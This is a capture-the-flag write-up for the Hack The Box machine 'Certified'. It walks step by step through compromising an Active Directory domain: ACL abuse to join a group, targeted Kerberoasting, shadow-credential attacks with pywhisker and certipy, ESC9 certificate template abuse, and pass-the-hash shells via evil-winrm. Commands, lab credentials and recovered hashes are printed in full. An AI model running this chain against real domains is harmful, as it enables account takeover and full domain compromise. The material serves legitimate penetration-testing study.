# Nmap
```
# Nmap 7.95 scan initiated Fri Jul 25 16:10:46 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.41
Nmap scan report for 10.10.11.41
Host is up (0.34s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-25 13:26:39Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
|_ssl-date: 2025-07-25T13:28:16+00:00; -2h44m30s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
|_ssl-date: 2025-07-25T13:28:15+00:00; -2h44m30s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-25T13:28:16+00:00; -2h44m30s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certified.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-25T13:28:15+00:00; -2h44m30s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
| Not valid before: 2025-06-11T21:04:20
|_Not valid after:  2105-05-23T21:04:20
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -2h44m31s, deviation: 2s, median: -2h44m30s
| smb2-time: 
|   date: 2025-07-25T13:27:30
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 25 16:12:50 2025 -- 1 IP address (1 host up) scanned in 124.11 seconds
```
Add `DC01.certified.htb` and `certified.htb` to our `/etc/hosts`

We have get the credit of  `judith.mader`
```
Machine Information

As is common in Windows pentests, you will start the Certified box with credentials for the following account: Username: judith.mader Password: judith09
```

# Bloodhound by judith.mader
Firstly, I would like enumerate the all the domain users
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ nxc ldap 10.10.11.41 -u judith.mader -p 'judith09'
LDAP        10.10.11.41     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09 
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ nxc ldap 10.10.11.41 -u judith.mader -p 'judith09' --users
LDAP        10.10.11.41     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09 
LDAP        10.10.11.41     389    DC01             [*] Enumerated 9 domain users: certified.htb
LDAP        10.10.11.41     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.11.41     389    DC01             Administrator                 2024-05-13 14:53:16 0        Built-in account for administering the computer/domain      
LDAP        10.10.11.41     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.11.41     389    DC01             krbtgt                        2024-05-13 15:02:51 0        Key Distribution Center Service Account                     
LDAP        10.10.11.41     389    DC01             judith.mader                  2024-05-14 19:22:11 0                                                                    
LDAP        10.10.11.41     389    DC01             management_svc                2024-05-13 15:30:51 0                                                                    
LDAP        10.10.11.41     389    DC01             ca_operator                   2024-05-13 15:32:03 0                                                                    
LDAP        10.10.11.41     389    DC01             alexander.huges               2024-05-14 16:39:08 0                                                                    
LDAP        10.10.11.41     389    DC01             harry.wilson                  2024-05-14 16:39:37 0                                                                    
LDAP        10.10.11.41     389    DC01             gregory.cameron               2024-05-14 16:40:05 0  
```

Then let's Bloodhound this account
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ sudo ntpdate certified.htb  
2025-07-25 13:33:53.715717 (+0000) -9836.520734 +/- 0.251805 certified.htb 10.10.11.41 s1 no-leap
CLOCK: time stepped by -9836.520734
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ bloodhound-python -u judith.mader -p 'judith09' -k -d certified.htb -ns 10.10.11.41 -c ALl --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certified.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.certified.htb
INFO: Found 10 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.certified.htb
INFO: Done in 01M 32S
INFO: Compressing output into 20250725133359_bloodhound.zip
```
![](images/Pasted%20image%2020250725133647.png)
![](images/Pasted%20image%2020250725133706.png)
That means we can exploit `Management` group to get the access to `Management_scv`account

Let's exploit it:
Step 1 :Modify the `ACL` of the Management group and grant the `WriteMembers` permission to the`judith.mader` user
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ owneredit.py -action write -new-owner judith.mader -target management certified/judith.mader:judith09 -dc-ip 10.10.11.41
[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!

┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ dacledit.py -action 'write' -rights 'WriteMembers' -principal judith.mader -target Management 'certified'/'judith.mader':'judith09' -dc-ip 10.10.11.41
[*] DACL backed up to dacledit-20250725-134711.bak
[*] DACL modified successfully!
```

Step 2: Add Judith herself to the Management group
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ bloodyAD --host 10.10.11.41 -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"

[+] judith.mader added to Management
```

Step 3: Get `NTLM` for `Management_SVC`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ /opt/targetedKerberoast/targetedKerberoast.py -v -d 'certified.htb' -u 'judith.mader' -p 'judith09'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (management_svc)
$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$435c86b95fb62a92880b1bc9599dc4cf$24c787db292fcd10ae0699c95210293e3247894b534cd7d267bbe3b9c0c5425366737f25351a9586a7cf4fa0093120277e65d362ab0c4a78e8204e4ce235f98580aed7b2015b43fef46cbb7a7193a1eb646e3d51d79752536f01d868b58e45ab199f96e0b5be545269eef000d5e014512527dfdeff34a7cc6fa2402b53d86bd0196b75cec8bd873231cc3b48516aaf2b48f6d284ee1469b8a7122a3c9c1b452b84696300b6139d83912d1fa9f56f85073a2a5e30c77e032ad870a8cf46575d0ee96da6114e0460ab28463c5314fcfafc15022c4f65efacd54926e5864747bb48b5d3d8519a887b44b4483a28825e62a612fae76c8a2db22ab8c8b74f70e7ec0b23d0d0f4b271cd78f566e5f602df682b248e7705e306ee3f1887229184d921e91d3e70d124f55fcc256c5878537b1720d6dc75aff718511c29595015f9af7cc975593f74a9b58d848269bff7256197c68d36ba6da3fdd95b901552c8ff7fb24f2b22f036ba11ccb72ed53f3511437faf32ae5c8bc974e3e2e7fbda82fd16d7020ac810b22b42d1c835a8623a4d489d5d09ed460eacace1dcf50ebf0a1b765816168e823f162a8a48d8a1ea12584a6660342cb3fcfcb5bd3f13443d0a1f787b0421de03e1823a8c6ce3a68aa648cdbcfb6ff2a59fc1cced0e064b49d204f88f7cc8cf470fd1998bda4a0c6c149d1aa94788527f2c7652f2d86a702f06721caccb118bbd9d7b09eed2569edd3e99c1fcff18b9de9d8df30b11d30daace14965cad633fc9e3261911fc862717db1e83ebdf7c92550c9970ee2fd04775e5b4797a8375a704a0f925b7ace16050ed8bcc06c064874237f0962aa5dd3ae13df6446297861854ed4b5250c84a7684c4674de24762ddde1263ed7b97a4c846a4c218fbff56d481bd1f0ff5f878349d697eda8d6200a775770c8a18f3954c70f98f5ba5bb304dc081fc807e86d24aa5ef0e0470f8ac51c9f7f7f043dceae26d18eef2b6fd01880061a125263294b30ed7ce488002768dc2975ebb05dbb495a8a0484dd25ae55a372fb0baa38ae287d13455994d8e40c190a2c9fd44589571eb530ab2e89743da8cdd91bf4adb5ceadee80913e0c5f808074ca10ee8c1a89ef2dc466518819741100292d55797d3ae70d9950f4629048062051c53a808eaa345cf3f3b21d25953dd2f6c76a1dd33b6d54c7918ae6be187ecd26a409a0131f149e201f724b01b700ef00a9298907c7f89d2fc4e3f3cf832fa78f6c0607744bafdad3eaa592522a32d61bd057313bc94346fd2cbf2b3b501ca124a7c9ec4e812e8a5eff756aacad224633892be5abcdad5177e3ce39f73a1e3521ac576e53552082b8ecee469f8f6ab65cce07b47908d3e68e816cceed113186943784430278fe1f25c81fc8489048af5c2494e94ebb16599ce17faacff8aff357439ebc26f466c314b00f327f0d8f2a0c89b86d8e9a85537601f5ea2116a4317b37a9065812b898fa73bc1af147d1daf83d059d79c047e0d4d39bdf545bf9b0b1477097b66ccbe0837fdfdd997a6a28091aedfe470708820d31a62855b870ae64d627c062404fd2e38544baea368
```

Then we can use john to crack it, but I could not crack it.

So I will also try another way:
```
┌──(wither㉿localhost)-[/opt/pywhisker/pywhisker]
└─$ python3 pywhisker.py -d 'certified.htb' -u 'judith.mader' -p 'judith09' --target "management_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 062fe49a-55fa-48b3-753b-db43279cafef
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: tELYYQnX.pfx
[+] PFX exportiert nach: tELYYQnX.pfx
[i] Passwort für PFX: ib0aHAR5SntwPQnIBJBI
[+] Saved PFX (#PKCS12) certificate & key at path: tELYYQnX.pfx
[*] Must be used with password: ib0aHAR5SntwPQnIBJBI
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

Then use the `gettgtpkinit.py` script from `PKINITtools` to request a `Kerberos TGT`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ python3 /opt/PKINITtools/gettgtpkinit.py -cert-pfx tELYYQnX.pfx -pfx-pass ib0aHAR5SntwPQnIBJBI certified.htb/management_svc management_svc.ccache
2025-07-25 14:00:05,345 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-07-25 14:00:05,358 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-07-25 14:00:20,987 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-07-25 14:00:20,987 minikerberos INFO     c45fb0f1b900c714528cbca147f15e0bf3b12bfef0f74ce4eebe8986ee691d84
INFO:minikerberos:c45fb0f1b900c714528cbca147f15e0bf3b12bfef0f74ce4eebe8986ee691d84
2025-07-25 14:00:20,991 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file

┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ export KRB5CCNAME=management_svc.ccache 
```

Use the `getnthash.py` script in `PKINITtools` to request and recover the NT hash of the `management_svc` account using the obtained `TGT`.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ python3 /opt/PKINITtools/getnthash.py -key c45fb0f1b900c714528cbca147f15e0bf3b12bfef0f74ce4eebe8986ee691d84 certified.htb/management_svc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584
```

Of course, we can use `certipy-ad` to help us get that
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'management_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '93ea71e3-a30a-9cb2-9c30-32cb08826c3e'
[*] Adding Key Credential with device ID '93ea71e3-a30a-9cb2-9c30-32cb08826c3e' to the Key Credentials for 'management_svc'
[*] Successfully added Key Credential with device ID '93ea71e3-a30a-9cb2-9c30-32cb08826c3e' to the Key Credentials for 'management_svc'
[*] Authenticating as 'management_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'management_svc@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'management_svc.ccache'
File 'management_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'management_svc.ccache'
[*] Trying to retrieve NT hash for 'management_svc'
[*] Restoring the old Key Credentials for 'management_svc'
[*] Successfully restored the old Key Credentials for 'management_svc'
[*] NT hash for 'management_svc': a091c1832bcdd4677c28b5a6a1295584

```

Then we can run the shell as `management_svc`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ nxc winrm 10.10.11.41 -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
WINRM       10.10.11.41     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
WINRM       10.10.11.41     5985   DC01             [+] certified.htb\management_svc:a091c1832bcdd4677c28b5a6a1295584 (Pwn3d!)

┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ evil-winrm -i 10.10.11.41 -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> 
```

# Auth as CA_OPERATOR
Let's come back to Bloodhound
![](images/Pasted%20image%2020250725140732.png)
Account `Managament_SVC` have the right of  `GenericAll` to account `CA_OPERATOR`

Just like before we do, let's exploit it 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad shadow auto -username management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator -target certified.htb -dc-ip 10.10.11.41
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '6ee0fe9d-4af3-93d2-fe11-e75764c5ec61'
[*] Adding Key Credential with device ID '6ee0fe9d-4af3-93d2-fe11-e75764c5ec61' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '6ee0fe9d-4af3-93d2-fe11-e75764c5ec61' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2

```

# ESC 9
Then we can use `certipy-ad` to help us find the vulnerable case 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad find -u ca_operator -hashes 'b4b86f45c6018f1b664f70805f45d8f2' -dc-ip 10.10.11.41 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'certified-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'certified-DC01-CA'
[*] Checking web enrollment for CA 'certified-DC01-CA' @ 'DC01.certified.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250725141726_Certipy.txt'
[*] Wrote text output to '20250725141726_Certipy.txt'
[*] Saving JSON output to '20250725141726_Certipy.json'
[*] Wrote JSON output to '20250725141726_Certipy.json'
```

Then we can find the vulnerable case `ESC 9`
![](images/Pasted%20image%2020250725141908.png)

Please follow this wiki to exploit `ESC9`
```
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc9-no-security-extension-on-certificate-template
```

Then Let's exploit it step by step

Step 1: Read initial `UPN` of the victim account (Optional - for restoration).
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad account \
    -u management_svc -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
    -dc-ip '10.10.11.41' -user 'ca_operator' \
    read
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_operator':
    cn                                  : operator ca
    distinguishedName                   : CN=operator ca,CN=Users,DC=certified,DC=htb
    name                                : operator ca
    objectSid                           : S-1-5-21-729746778-2675978091-3820388244-1106
    sAMAccountName                      : ca_operator
    userPrincipalName                   : ca_operator@certified.htb
    userAccountControl                  : 66048
    whenCreated                         : 2024-05-13T15:32:03+00:00
    whenChanged                         : 2025-07-25T14:13:05+00:00
```

Step 2: Update the victim account's `UPN` to the target administrator's `sAMAccountName`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad account \
    -u management_svc -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
    -dc-ip '10.10.11.41' -upn 'administrator' \
    -user 'ca_operator' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_operator'
```
Now, the `ca_operator` account has its `UPN` temporarily set to administrator.

Step 3: (If needed) Obtain credentials for the "victim" account (e.g., via Shadow Credentials)
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad shadow \                                                          
    -u management_svc -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
    -dc-ip '10.10.11.41' -account 'ca_operator' \
    auto
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_operator'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '2c8398a1-b1ca-4f11-4596-02e520ae9743'
[*] Adding Key Credential with device ID '2c8398a1-b1ca-4f11-4596-02e520ae9743' to the Key Credentials for 'ca_operator'
[*] Successfully added Key Credential with device ID '2c8398a1-b1ca-4f11-4596-02e520ae9743' to the Key Credentials for 'ca_operator'
[*] Authenticating as 'ca_operator' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_operator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_operator.ccache'
File 'ca_operator.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ca_operator.ccache'
[*] Trying to retrieve NT hash for 'ca_operator'
[*] Restoring the old Key Credentials for 'ca_operator'
[*] Successfully restored the old Key Credentials for 'ca_operator'
[*] NT hash for 'ca_operator': b4b86f45c6018f1b664f70805f45d8f2
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ export KRB5CCNAME=ca_operator.ccache         
```

Step 4: Request a certificate as the "victim" user from the `ESC9` template
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad req \
    -k -dc-ip '10.10.11.41' \
    -target 'DC01.certified.htb' -ca 'certified-DC01-CA' \
    -template 'CertifiedAuthentication'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail
[*] Requesting certificate via RPC
[*] Request ID is 5
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

Step 5: Revert the "victim" account's `UPN`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad account \
    -u management_svc -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
    -dc-ip '10.10.11.41' -upn 'ca_operator@certified.htb' \
    -user 'ca_operator' update
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_operator':
    userPrincipalName                   : ca_operator@certified.htb
[*] Successfully updated 'ca_operator'
```

Step 6: Authenticate as the target administrator.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ certipy-ad auth \
    -dc-ip '10.10.11.41' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'certified.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*] Using principal: 'administrator@certified.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certified.htb': aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34

```

Then we can use the hash to get the shell as administrator
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certified]
└─$ evil-winrm -i 10.10.11.41 -u administrator -H '0d5b49608bbce1751f708748f67e2d34' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

# Description
Very typical AD machine, not too much, every step is very obvious.